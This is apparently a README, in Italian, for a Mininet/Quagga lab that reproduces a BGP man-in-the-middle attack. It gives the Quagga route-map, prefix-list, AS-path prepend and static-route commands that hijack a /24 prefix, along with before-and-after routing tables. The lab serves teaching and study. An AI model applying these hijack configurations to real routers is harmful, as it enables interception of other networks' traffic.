# bgp-man-in-the-middle

Descrizione dell'attacco disponibile qui: https://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-pilosov-kapela.pdf

---

## Preparazione Mininet

- `git clone https://github.com/mininet/mininet`

- `cd mininet`

- `git checkout 2.3.0d4`

- `util/install.sh -a`

- `mn --test pingall`

- `mn --version`

## Preparazione Quagga

- esegui il download quagga-1.2.4 da [qui](http://download.savannah.gnu.org/releases/quagga/) nella tua `$HOME` ed estrai il file compresso

- `cd ~/quagga-1.2.4`

- `chown mininet:mininet /var/run/quagga`

- modifica il file `configure`, aggiungendo `${quagga_statedir_prefix}/var/run/quagga` prima di tutte le opzioni nel loop `for` per `QUAGGA_STATE_DIR`

- `./configure --enable-user=mininet --enable-group=mininet`

- `make`

---

## Spiegazione dell'attacco

La topologia presenta sei AS (AS100, AS200, AS10, AS20, AS30, AS40) ognuno gestito da un'istanza del daemon bgp (rispettivamente R100, R200, R10, R20, R30, R40).

![topologia](./images/bgp-mitm-topology.png)

L'attaccante R100 vuole fare da man-in-the-middle tra la rete 10.200.0.0/22 ospitata dall'AS200 e gli host appartenenti agli AS AS40 e AS30.

Quando la rete è stabile, il traffico instradato verso la rete 10.200.0.0/22 segue i path descritti dalla figura che segue. Vediamo quale AS_PATH rispetta ciascun AS per raggiungerla.

|AS|AS_PATH|
|-|-|
|AS10	|AS20, AS200|
|AS20	|AS200|
|AS30	|AS200|
|AS40	|AS30, AS200|
|AS100	|AS10, AS20, AS200|

![topologia](./images/bgp-mitm-pre-attack.png)

L'attaccante R100 annuncia la rete 10.200.0.0 con una subnet più specifica. Quindi invece che una /22 annuncia una /24. Quetsto è possibile sfruttando una route-map.

<!-- https://www.examcollection.com/certification-training/ccnp-concept-of-route-maps.html -->

> Una route-map personalizza la gestione del traffico, al di là di quanto dettato dalla routing table. Le route-map sono principalmente usate per distribuire le rotte nei processi di routing RIP, EIGRP, OSPF o BGP. Vengono anche usate per la generazione della rotta di default nel processo di routing OSPF. Definiscono anche quali rotte da uno specifico protocollo di routing possono essere redistribuite in uno specifico processo di routing.
> Le route-map hanno alcune caratteristiche in comune con le ACL. Entrambe sono un meccanismo generico. Sono una sequenza ordinata di singole istruzioni, ognuna delle quali può risultare in un deny o in un permit.
> Per quanto riguarda le differenze, le route-map sono più flessibili delle ACL e possono eseguire dei controlli sulle rotte in base a criteri non disponibili per le ACL. Il risultato dell'applicazione di un'ACL è sì o no, quindi consente o meno la redistribuzione della rotta. Mentre la route-map non solo permette o nega la redistribuzione ma è in grado di modificare le informazioni associate alla rotta.

Gli AS sceglieranno la rotta più specifica per inoltrare il traffico, quindi la /24.

L'attaccante R100 deve installare una rotta statica per la rete 10.200.0.0/24 verso AS10. Infatti quando riceve il traffico originato da AS40 o AS30 e destinato a AS200, lo deve inoltrare ad AS10.

![topologia](./images/bgp-mitm-post-attack.png)

A seguito dell'attacco gli AS_PATH rispettati da ciascun AS per raggiungere la rete 10.200.0.0/24 risultano i seguenti.

|AS|AS_PATH|
|-|-|
|AS10	|AS20, AS200|
|AS20	|AS200|
|AS30	|AS40, AS100|
|AS40	|AS100|
|AS100	|AS10, AS20, AS200|

Vediamo che gli AS30 e AS40 suppongono che la rete 10.200.0.0/24 sia ospitata dall'AS100. Quindi il traffico in partenza da AS30 e AS40 destinato alla rete 10.200.0.0/24 viene inoltrato all'AS100, che lo gestirà usando la rotta statica precedentemente impostata inoltrando il traffico verso l'AS10.

## Esecuzione dell'attacco

Per provare la simulazione, seguiamo i seguenti passi.

**. Avviamo l'ambiente di simulazione.**

Avviamo le istanze dei router, degli AS e degli host eseguendo il comando.

`$ python bgp.py`

**. Accediamo al daemon bgp.**

In un altro terminale avviamo una sessione con il daemon bgp dell'AS100. La password per accedere come utente è `en`. 

`$ ./connect-bgp.sh`

Per accedere alla shell di amministratore lanciamo il comando `en`; la password di accesso è `en`.

```
bgpd-R100> en
Password: 
bgpd-R100# 
```

**. Controlliamo la routing table.**

Verifichiamo le entry di routing di R100 quando la rete è stabile. Lanciamo il comando:

`bgpd-R100# show ip bgp`

Output:

	BGP table version is 0, local router ID is 100.100.100.100
	Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
	              i internal, r RIB-failure, S Stale, R Removed
	Origin codes: i - IGP, e - EGP, ? - incomplete
	
	   Network          Next Hop            Metric LocPrf Weight Path
	*> 10.10.0.0/22     10.10.110.1              0             0 10 i
	*  10.20.0.0/22     10.10.140.1                            0 40 30 200 20 i
	*>                  10.10.110.1                            0 10 20 i
	*  10.30.0.0/22     10.10.110.1                            0 10 20 200 30 i
	*>                  10.10.140.1                            0 40 30 i
	*> 10.40.0.0/22     10.10.140.1              0             0 40 i
	*> 10.100.0.0/22    0.0.0.0                  0         32768 i
	*  10.200.0.0/22    10.10.110.1                            0 10 20 200 i
	*>                  10.10.140.1                            0 40 30 200 i
	
	Displayed  6 out of 9 total prefixes

Dall'output riusciamo a capire se l'AS100 per raggiungere la rete 10.200.0.0/22 sceglie il path "10 20 200" (caso 1) oppure il path "40 30 200" (caso 2). Qui ricadiamo nel caso 1.

**. Accediamo al daemon zebra.**

In un altro terminale avviamo una sessione con il daemon zebra del R100. La password per accedere come utente è `en`. 

`$ ./connect-zebra.sh`

Per accedere alla shell di amministratore lanciamo il comando `en`; la password di accesso è `en`.

```
R100> en
Password: 
R100# 
```

**. Controlliamo le rotte.**

Verifichiamo le rotte scelte da R100. Lanciamo il comando:

`R100# show ip route`

Output:

	Codes: K - kernel route, C - connected, S - static, R - RIP,
	       O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel, N - NHRP,
	       > - selected route, * - FIB route
	
	B>* 10.10.0.0/22 [20/0] via 10.10.110.1, R100-eth2, 00:00:28
	C>* 10.10.110.0/30 is directly connected, R100-eth2
	C>* 10.10.140.0/30 is directly connected, R100-eth3
	B>* 10.20.0.0/22 [20/0] via 10.10.110.1, R100-eth2, 00:00:25
	B>* 10.30.0.0/22 [20/0] via 10.10.140.1, R100-eth3, 00:00:25
	B>* 10.40.0.0/22 [20/0] via 10.10.140.1, R100-eth3, 00:00:28
	C>* 10.100.0.0/24 is directly connected, R100-eth1
	B>* 10.200.0.0/22 [20/0] via 10.10.110.1, R100-eth2, 00:00:22
	C>* 127.0.0.0/8 is directly connected, lo
	C>* 127.0.0.1/32 is directly connected, lo

Vediamo che per raggiungere la rete 10.200.0.0/22 R100 usa una rotta appresa tramite BGP passando attraverso l'AS10 (il router dirimpettaio R10 ha indirizzo IP 10.10.110.1).

**. Lanciamo l'attacco.**

Imponiamo la route-map. Nella shell bgp di R100 lanciamo i seguenti comandi (caso 1)

	bgpd-R100# configure terminal
	
	bgpd-R100(config)# router bgp 100
	bgpd-R100(config)#   network 10.200.0.0/24
	##################   la rete viene annunciata ai vicini
	bgpd-R100(config)#   neighbor 10.10.110.1 route-map evil-route-map out
	##################   la route-map viene applicata verso l'AS10
	bgpd-R100(config)#   exit
	bgpd-R100(config)# ip prefix-list evil-prefix-list permit 10.200.0.0/24
	################## definizione della prefix-list
	bgpd-R100(config)# route-map evil-route-map permit 10
	################## definizione della route-map
	bgpd-R100(config)#   match ip address prefix-list evil-prefix-list
	##################   restringe la route-map ai soli indirizzi che fanno match con la prefix-list
	bgpd-R100(config)#   set as-path prepend 10 20 200
	##################   azione da applicare agli annunci che fanno match

oppure (caso 2)

	bgpd-R100# configure terminal
	
	bgpd-R100(config)# router bgp 100
	bgpd-R100(config)#   network 10.200.0.0/24
	bgpd-R100(config)#   neighbor 10.10.140.1 route-map evil-route-map out
	bgpd-R100(config)#   exit
	bgpd-R100(config)# ip prefix-list evil-prefix-list permit 10.200.0.0/24
	bgpd-R100(config)# route-map evil-route-map permit 10
	bgpd-R100(config)#   match ip address prefix-list evil-prefix-list
	bgpd-R100(config)#   set as-path prepend 40 30 200

Impostiamo la rotta statica. Nella shell zebra di R100 lanciamo i seguenti comandi (caso 1)

	R100# configure terminal
	R100(config)# ip route 10.200.0.0/24 10.10.110.1

oppure (caso 2)

	R100# configure terminal
	R100(config)# ip route 10.200.0.0/24 10.10.140.1

**. Controlliamo le scelte di routing degli AS**

Accediamo al daemon bgp di R40 (`./connect-bgp.sh R40`) e la sua routing table (`bgpd-R40# show ip bgp`) risulta:

	BGP table version is 0, local router ID is 40.40.40.40
	Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
	              i internal, r RIB-failure, S Stale, R Removed
	Origin codes: i - IGP, e - EGP, ? - incomplete
	
	   Network          Next Hop            Metric LocPrf Weight Path
	*> 10.10.0.0/22     10.10.140.2                            0 100 10 i
	*  10.20.0.0/22     10.10.140.2                            0 100 10 20 i
	*>                  10.10.70.1                             0 30 200 20 i
	*> 10.30.0.0/22     10.10.70.1               0             0 30 i
	*> 10.40.0.0/22     0.0.0.0                  0         32768 i
	*> 10.100.0.0/22    10.10.140.2              0             0 100 i
	*  10.200.0.0/22    10.10.140.2                            0 100 10 20 200 i
	*>                  10.10.70.1                             0 30 200 i
	*> 10.200.0.0/24    10.10.140.2              0             0 100 i
	
	Displayed  7 out of 9 total prefixes
	
Vediamo che R40 inoltrerà il traffico verso la rete 10.200.0.0/24 attraverso l'AS100 invece che attraverso l'AS30.

Analogamente per il daemon bgp di R30 risulta

	BGP table version is 0, local router ID is 30.30.30.30
	Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
	              i internal, r RIB-failure, S Stale, R Removed
	Origin codes: i - IGP, e - EGP, ? - incomplete
	
	   Network          Next Hop            Metric LocPrf Weight Path
	*  10.10.0.0/22     10.10.70.2                             0 40 100 10 i
	*>                  10.10.230.2                            0 200 20 10 i
	*  10.20.0.0/22     10.10.70.2                             0 40 100 10 20 i
	*>                  10.10.230.2                            0 200 20 i
	*> 10.30.0.0/22     0.0.0.0                  0         32768 i
	*> 10.40.0.0/22     10.10.70.2               0             0 40 i
	*  10.100.0.0/22    10.10.230.2                            0 200 20 10 100 i
	*>                  10.10.70.2                             0 40 100 i
	*> 10.200.0.0/22    10.10.230.2              0             0 200 i
	*> 10.200.0.0/24    10.10.70.2                             0 40 100 i
	
	Displayed  7 out of 10 total prefixes

Vediamo che R30 inoltrerà il traffico verso la rete 10.200.0.0/24 attraverso l'AS40 invece che direttamente all'AS200.

**. Fermiamo l'ambiente di simulazione.**

Fermiamo il terminali connessi a R100.

`bgpd-R100# exit`

`R100# exit`

Fermiamo le istanze digitando exit nel terminale di mininet.

`mininet> exit`

# UPDATE scambiati tra i router

Prima dell'attacco AS10 annuncia ad AS100 la raggiungibilità della rete 10.200.0.0/22 attraverso gli AS AS10, AS20, AS200

![R100-pre-attack-R10-UPDATE](./images/0-R100-pre-attack-R10-UPDATE.png)

Dopo l'attacco AS100 annuncia ad AS10 la raggiungibilità della rete 10.200.0.0/24 anteponendo se stesso agli AS AS10, AS20, AS200

![R100-post-attack-R100-UPDATE](./images/1-R100-post-attack-R100-UPDATE.png)

Dopo l'attacco AS10 annuncia ad AS100 la raggiungibilità della rete 10.200.0.0/24 attraverso gli AS AS10, AS20, AS200, AS30, AS40, AS100

![R100-post-attack-R10-UPDATE](./images/2-R100-post-attack-R10-UPDATE.png)

Prima dell'attacco AS100 annuncia ad AS40 la raggiungibilità della rete 10.200.0.0/22 attraverso gli AS AS100, AS10, AS20, AS200

![R100-pre-attack-R100-UPDATE](./images/3-R100-pre-attack-R100-UPDATE.png)

Prima dell'attacco AS40 annuncia ad AS100 la raggiungibilità della rete 10.200.0.0/22 attraverso gli AS AS40, AS30, AS200

![R100-pre-attack-R40-UPDATE](./images/4-R100-pre-attack-R40-UPDATE.png)

Dopo l'attacco AS100 annuncia ad AS40 la raggiungibilità della rete 10.200.0.0/24 attraverso se stesso

![R100-post-attack-R100-UPDATE](./images/5-R100-post-attack-R100-UPDATE.png)

Prima dell'attacco AS30 annuncia ad AS40 la raggiungibilità della rete 10.200.0.0/22 attraverso gli AS AS30, AS200

![R40-pre-attack-R30-UPDATE](./images/6-R40-pre-attack-R30-UPDATE.png)

Dopo l'attacco AS40 annuncia ad AS30 la raggiungibilità della rete 10.200.0.0/24 attraverso gli AS AS40, AS100

![R40-post-attack-R40-UPDATE](./images/7-R40-post-attack-R40-UPDATE.png)

Prima dell'attacco AS200 annuncia ad AS30 la raggiungibilità della rete 10.200.0.0/22 attraverso se stesso

![R30-pre-attack-R200-UPDATE](./images/8-R30-pre-attack-R200-UPDATE.png)

Dopo l'attacco AS30 annuncia ad AS200 la raggiungibilità della rete 10.200.0.0/24 attraverso gli AS AS30, AS40, AS100

![R30-pre-attack-R30-UPDATE](./images/9-R30-pre-attack-R30-UPDATE.png)
